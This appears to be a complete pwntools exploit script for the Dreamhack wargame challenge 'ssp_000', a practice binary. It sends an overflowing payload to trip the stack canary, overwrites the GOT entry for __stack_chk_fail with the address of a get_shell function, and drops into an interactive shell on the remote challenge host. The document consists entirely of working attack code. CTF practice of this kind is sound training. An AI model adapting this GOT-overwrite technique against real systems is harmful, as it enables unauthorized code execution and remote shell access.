#!/usr/bin/python3

from pwn import *

#p = process("./ssp_000")
p = remote("host1.dreamhack.games", 9319)
e = ELF("./ssp_000")

sla = lambda s: p.sendlineafter(": ", s)

payload = "A".encode('utf-8') * 0x48
payload += "YouFail".encode('utf-8')
p.sendline(payload)

sla(str(e.got['__stack_chk_fail']))
sla(str(e.sym['get_shell']))

p.interactive()
